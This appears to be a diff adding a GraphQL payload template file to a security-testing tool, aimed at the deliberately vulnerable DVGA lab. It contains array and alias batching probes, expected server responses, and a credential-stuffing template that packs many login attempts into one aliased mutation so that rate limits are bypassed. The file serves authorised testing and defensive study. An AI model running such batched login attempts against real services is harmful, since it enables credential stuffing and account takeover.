@@ -1,0 +1,143 @@
+# payloads/graphql/batch_payloads.graphql
+# Phase 12: GraphQL Batch Abuse Payload Templates
+#
+# These payloads demonstrate both forms of GraphQL batch abuse.
+# Replace <TARGET_MUTATION>, <EMAIL_FIELD>, <PASSWORD_FIELD>
+# with values discovered from introspection (Phase 5).
+#
+# Lab: DVGA - docker pull dolevf/dvga
+# ================================================================
+
+
+# ================================================================
+# SECTION 1 — ARRAY BATCH PAYLOAD
+# ================================================================
+# Send as the HTTP request body (JSON array).
+# This tests whether the server accepts multiple operations
+# in a single POST request.
+#
+# HTTP Request format:
+#   POST /graphql HTTP/1.1
+#   Content-Type: application/json
+#
+#   [
+#     {"query": "{ __typename }"},
+#     {"query": "{ __typename }"},
+#     ... (repeat N times)
+#   ]
+#
+# Vulnerable response: A JSON array with N response objects.
+# Protected response: HTTP 400 or error about batch not supported.
+# ================================================================
+
+# ARRAY_BATCH_PROBE (harmless — uses __typename)
+# Use this first to confirm array batching is supported
+# without needing credentials or a known mutation.
+#
+# JSON payload (Python: json.dumps([{"query": q}] * 10)):
+# [
+#   {"query": "{ __typename }"},
+#   {"query": "{ __typename }"},
+#   {"query": "{ __typename }"},
+#   {"query": "{ __typename }"},
+#   {"query": "{ __typename }"},
+#   {"query": "{ __typename }"},
+#   {"query": "{ __typename }"},
+#   {"query": "{ __typename }"},
+#   {"query": "{ __typename }"},
+#   {"query": "{ __typename }"}
+# ]
+
+
+# ================================================================
+# SECTION 2 — ALIAS BATCH PAYLOAD (Generic — No Auth Required)
+# ================================================================
+# This sends BATCH_SIZE aliases for the same field in one document.
+# Used to confirm alias batching is supported when no login
+# mutation is available from the schema.
+# ================================================================
+
+query GenericAliasBatch {
+  alias0: __typename
+  alias1: __typename
+  alias2: __typename
+  alias3: __typename
+  alias4: __typename
+  alias5: __typename
+  alias6: __typename
+  alias7: __typename
+  alias8: __typename
+  alias9: __typename
+}
+
+
+# ================================================================
+# SECTION 3 — ALIAS BATCH LOGIN (Credential Stuffing Template)
+# ================================================================
+# Replace <TARGET_MUTATION>, <EMAIL_FIELD>, <PASSWORD_FIELD>
+# with values from introspection.
+#
+# Example for DVGA (uses createUser mutation as demo):
+# ================================================================
+
+# TEMPLATE — Fill in with real mutation name and arg names:
+#
+# mutation AliasBatchLogin {
+#   attempt0: <TARGET_MUTATION>(<EMAIL_FIELD>: "user0@test.com", <PASSWORD_FIELD>: "Pass0!") { token }
+#   attempt1: <TARGET_MUTATION>(<EMAIL_FIELD>: "user1@test.com", <PASSWORD_FIELD>: "Pass1!") { token }
+#   attempt2: <TARGET_MUTATION>(<EMAIL_FIELD>: "user2@test.com", <PASSWORD_FIELD>: "Pass2!") { token }
+#   attempt3: <TARGET_MUTATION>(<EMAIL_FIELD>: "user3@test.com", <PASSWORD_FIELD>: "Pass3!") { token }
+#   attempt4: <TARGET_MUTATION>(<EMAIL_FIELD>: "user4@test.com", <PASSWORD_FIELD>: "Pass4!") { token }
+#   attempt5: <TARGET_MUTATION>(<EMAIL_FIELD>: "user5@test.com", <PASSWORD_FIELD>: "Pass5!") { token }
+#   attempt6: <TARGET_MUTATION>(<EMAIL_FIELD>: "user6@test.com", <PASSWORD_FIELD>: "Pass6!") { token }
+#   attempt7: <TARGET_MUTATION>(<EMAIL_FIELD>: "user7@test.com", <PASSWORD_FIELD>: "Pass7!") { token }
+#   attempt8: <TARGET_MUTATION>(<EMAIL_FIELD>: "user8@test.com", <PASSWORD_FIELD>: "Pass8!") { token }
+#   attempt9: <TARGET_MUTATION>(<EMAIL_FIELD>: "user9@test.com", <PASSWORD_FIELD>: "Pass9!") { token }
+# }
+
+
+# DVGA EXAMPLE — createPaste mutation (available without auth on DVGA):
+# Tests that DVGA processes all aliases, proving the technique works.
+mutation DVGAAliasBatchProof {
+  attempt0: createPaste(title: "aegis_test_0", content: "probe", public: true) { paste { id } }
+  attempt1: createPaste(title: "aegis_test_1", content: "probe", public: true) { paste { id } }
+  attempt2: createPaste(title: "aegis_test_2", content: "probe", public: true) { paste { id } }
+  attempt3: createPaste(title: "aegis_test_3", content: "probe", public: true) { paste { id } }
+  attempt4: createPaste(title: "aegis_test_4", content: "probe", public: true) { paste { id } }
+}
+
+
+# ================================================================
+# SECTION 4 — EXPECTED RESPONSES
+# ================================================================
+
+# VULNERABLE ARRAY BATCH RESPONSE (server processes all operations):
+# [
+#   {"data": {"__typename": "Query"}},
+#   {"data": {"__typename": "Query"}},
+#   {"data": {"__typename": "Query"}},
+#   ... (N items)
+# ]
+
+# VULNERABLE ALIAS BATCH RESPONSE (server processes all aliases):
+# {
+#   "data": {
+#     "attempt0": {"token": null},
+#     "attempt1": {"token": null},
+#     "attempt2": {"token": null},
+#     ...
+#   },
+#   "errors": [
+#     {"message": "Invalid credentials", "path": ["attempt0"]},
+#     ...
+#   ]
+# }
+# NOTE: errors for each alias confirm the server PROCESSED each
+# alias individually — this proves the bypass even with failed logins.
+
+# PROTECTED RESPONSE (rate limit or batch rejection):
+# HTTP 429 Too Many Requests
+# OR
+# {"errors": [{"message": "Batch size exceeded maximum of 5"}]}
+# OR
+# {"errors": [{"message": "Too many aliases in a single query"}]}
